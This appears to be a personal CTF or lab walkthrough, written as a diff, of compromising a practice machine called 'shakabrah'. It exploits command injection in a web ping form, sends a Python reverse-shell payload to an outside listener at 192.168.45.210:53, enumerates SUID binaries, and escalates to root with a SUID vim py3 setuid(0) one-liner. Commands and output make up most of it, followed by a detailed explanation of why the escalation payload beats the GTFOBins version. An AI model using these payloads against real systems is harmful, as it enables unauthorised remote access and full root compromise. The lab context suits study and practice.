@@ -1,0 +1,126 @@
+┌──(root㉿kali)-[/home/kali]
+└─# curl 192.168.117.86
+<html>
+<body>
+
+    <h2>Connection Tester</h2>
+    <form method="get">
+        Ping: <input type="text" name="host" placeholder="127.0.0.1">
+        <input type="submit" value="Go">
+    </form>
+
+</body>
+</html>
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+127.0.0.1; which curl; which wget; which nc; which python3; which python; which perl; which bash; which /bin/nc; which /usr/bin/nc
+
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.044 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.068 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.037 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.038 ms
+
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3048ms
+rtt min/avg/max/mdev = 0.037/0.046/0.068/0.015 ms
+/usr/bin/curl
+/usr/bin/wget
+/bin/nc
+/usr/bin/python3
+/usr/bin/perl
+/bin/bash
+/bin/nc
+
+
+dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
+
+
+
+
+127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.45.210",53));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53  
+listening on [any] 53 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.117.86] 46028
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+www-data@shakabrah:/var$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/traceroute6.iputils
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/newgidmap
+/usr/bin/vim.basic
+/usr/bin/newuidmap
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/bin/umount
+/bin/fusermount
+/bin/ping
+/bin/mount
+/bin/su
+www-data@shakabrah:/var$ 
+
+High priority
+
+/usr/bin/pkexec (Polkit / pwnkit) — historically high impact (CVE‑2021‑4034). Check if vulnerable; if it is there are reliable local POCs that give root.
+/usr/bin/vim.basic (SUID vim) — if truly setuid root you can spawn a shell from vim (very quick, often works).
+Medium priority
+
+/usr/bin/newuidmap and /usr/bin/newgidmap — useful for user namespace tricks if system has subuid/subgid configured (requires more steps).
+/bin/fusermount — can be abused in certain setups (with user_allow_other, kernel specifics) to escalate.
+/usr/lib/snapd/snap-confine — snap escape techniques exist but are more involved.
+Lower / niche but worth checking
+
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper and /usr/lib/policykit-1/polkit-agent-helper-1 — these have had local escalation caveats in some environments.
+/usr/lib/openssh/ssh-keysign — limited use (host based auth); rarely an immediate RCE.
+/usr/bin/at, /usr/bin/mount, /bin/umount, /bin/ping, /usr/bin/passwd — expected SUIDs, but sometimes contain misconfiguration paths you can abuse
+
+
+
+
+/usr/bin/vim.basic -u NONE -N -i NONE -U NONE -c 'py3 import os,pty; os.setuid(0); pty.spawn("/bin/bash")'
+
+root@shakabrah:/var/www/html# id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+root@shakabrah:/var/www/html# cd /root/
+root@shakabrah:/root# ls
+proof.txt
+
+
+
+ explicitly set the UID to 0, used the correct embedded Python (py3), and spawned a pty — the GTFOBins line didn’t do all three, so it often fails on modern systems.
+
+Why the working command succeeded (what changed)
+
+It used the Python 3 interpreter that this vim build actually includes (+python3). Many GTFOBins examples use py (python2); if vim only has python3 those will be ignored.
+It called os.setuid(0) before creating a shell. That forces the process’ real/effective UID to root. Relying on exec alone (os.execl) is less reliable on modern systems where privilege semantics or the launched shell may drop privileges.
+It used pty.spawn("/bin/bash"). That creates a proper pseudo‑TTY for an interactive bash, so job control and interactive features work. The GTFOBins variant spawns a plain sh without allocating a pty, so the shell is broken or unusable.
+You suppressed vim config/runtime with -u NONE -N -i NONE -U NONE which removes noisy side effects (the E79 spam) and avoids unexpected plugin/rc behavior that can interfere with the exploit.
+Why the GTFOBins line often fails
+
+Wrong interpreter: GTFOBins often shows multiple variants; if you run the wrong one (py vs py3 vs perl), it simply won’t run because that feature isn’t compiled in.
+No explicit setuid call: os.execl replaces the process image but doesn’t guarantee real UID is set to 0 in all cases; some shells or environments will drop privileges if the real UID isn’t root. Calling os.setuid(0) is explicit and reliable.
+No pty allocation: spawning /bin/sh without a pty leaves you in a minimal, non-interactive shell (no job control, broken terminal behavior).
+Quoting/command context and vim runtime files can break the payload if not suppressed.
+What each part of the working one‑liner does
+
+-u NONE -N -i NONE -U NONE : don’t load vimrc, plugins, viminfo — reduces noise and side effects.
+-c 'py3 import os,pty; os.setuid(0); pty.spawn("/bin/bash")' : use vim’s python3 hook, set UID to 0, then spawn a bash attached to a new pty.
+Using python3 vs python2 : matches the feature set printed by vim --version (+python3, -python).
+
